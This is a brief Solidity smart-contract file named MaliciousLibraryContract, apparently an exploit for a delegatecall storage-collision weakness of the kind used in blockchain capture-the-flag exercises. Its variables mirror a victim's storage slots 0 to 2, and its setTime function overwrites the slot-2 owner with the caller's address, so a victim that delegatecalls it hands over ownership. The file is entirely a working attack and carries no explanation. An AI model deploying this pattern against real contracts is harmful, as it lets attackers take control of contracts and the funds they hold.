// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MaliciousLibraryContract {

    address public timeZone1Library;// Slot 0
    address public timeZone2Library;// Slot 1
    address public owner;// Slot 2

    function setTime(uint _time) public {
        owner = msg.sender;
    }
}